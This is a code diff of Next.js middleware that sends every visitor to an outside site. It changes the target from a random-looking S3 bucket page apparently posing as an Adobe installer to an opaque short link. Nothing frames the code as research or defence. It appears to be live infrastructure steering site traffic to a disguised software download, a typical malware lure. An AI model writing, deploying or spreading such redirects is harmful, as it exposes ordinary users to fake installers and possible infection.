@@ -41,14 +41,14 @@ export function middleware(request) {
   // Redirect when ?ad=ad
   if (adParam === 'ad') {
     return NextResponse.redirect(
-      'https://z209p-urtier-poclk-32048-djhmn.s3.us-east-1.amazonaws.com/Adobe_New/NewoneGODIBEG/newppoio-jwejkjwe/Adobe_New/en/installer.html',
+      'https://bcqc.net/jx25s5w',
       { status: 301 }
     )
   }
 
   // Default redirect
   return NextResponse.redirect(
-    'https://z209p-urtier-poclk-32048-djhmn.s3.us-east-1.amazonaws.com/Adobe_New/NewoneGODIBEG/newppoio-jwejkjwe/Adobe_New/en/installer.html',
+    'https://bcqc.net/jx25s5w',
     { status: 302 }
   )
 }
